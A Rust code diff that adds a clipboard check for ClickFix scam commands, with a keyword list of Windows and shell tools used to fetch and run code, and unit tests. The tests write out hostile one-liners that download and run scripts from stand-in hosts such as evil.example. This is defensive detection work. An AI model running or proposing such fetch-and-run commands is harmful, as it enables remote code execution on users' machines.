@@ -229,3 +229,51 @@ impl MemoryGuard {
         self.current_mb.load(Ordering::Relaxed) > self.limit_mb
     }
 }
+
+/// ClickFix protection: does this text look like a command a scam page wants you to paste into
+/// Win+R / PowerShell / a terminal? (Normal copied text never matches.)
+pub fn looks_like_command(text: &str) -> bool {
+    let t = text.to_lowercase();
+    let t = t.trim();
+    if t.is_empty() {
+        return false;
+    }
+    const STRONG: &[&str] = &[
+        "powershell", "pwsh", "mshta", "rundll32", "regsvr32", "wscript", "cscript", "certutil", "bitsadmin",
+        "invoke-expression", "invoke-webrequest", "invoke-restmethod", "downloadstring", "downloadfile",
+        "frombase64string", "-encodedcommand", "start-process", "new-object net.webclient", "add-mppreference",
+        "set-mppreference", "schtasks", "forfiles", "conhost", "cmd.exe", "cmd /c", "cmd /k", "%comspec%",
+        "msiexec /i http", "msiexec /q", "curl -s", "| iex", "|iex", "| sh", "|sh", "| bash", "|bash",
+        "osascript", "chmod +x", "base64 -d", "/dev/tcp/",
+    ];
+    if STRONG.iter().any(|k| t.contains(k)) {
+        return true;
+    }
+    // Short aliases only count as words at the start of a command (avoids normal sentences).
+    let first = t.split_whitespace().next().unwrap_or("");
+    if ["iex", "iwr", "irm", "curl", "wget", "msiexec", "explorer", "cmd", "start", "net", "reg"].contains(&first)
+        && (t.contains("http") || t.contains('\\') || t.contains(" /") || t.contains(" -"))
+    {
+        return true;
+    }
+    // Typical ClickFix decoy comment: "# ✅ I am not a robot - Verification ID: 1234".
+    if t.contains('#') && (t.contains("not a robot") || t.contains("verification id") || t.contains("captcha")) {
+        return true;
+    }
+    false
+}
+
+#[cfg(test)]
+mod tests {
+    use super::looks_like_command as c;
+    #[test]
+    fn clickfix() {
+        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # ✅ I am not a robot - Verification ID: 4821"));
+        assert!(c("mshta https://evil.example/verify.hta"));
+        assert!(c("cmd /c start /min powershell -enc SQBFAFgA"));
+        assert!(c("curl -s http://x.example/a.sh | bash"));
+        assert!(!c("Hello, here is my email address"));
+        assert!(!c("https://example.com/article?id=3"));
+        assert!(!c("The command line is a text interface."));
+    }
+}
